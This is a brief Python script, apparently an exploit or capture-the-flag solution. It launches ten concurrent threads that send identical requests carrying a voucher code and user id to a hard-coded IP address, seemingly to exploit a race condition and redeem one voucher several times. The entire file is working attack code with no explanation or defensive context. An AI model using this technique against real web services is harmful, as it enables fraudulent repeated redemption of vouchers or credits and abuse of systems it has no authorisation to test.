import requests
from threading import Thread


def main():
        r = requests.get('http://62.173.140.174:16023/index.php?voucherCode=5mbhxgw&uid=867580299442370')


i=0
while i<10:
        i+=1
        th1 = Thread(target=main)
        th1.start()
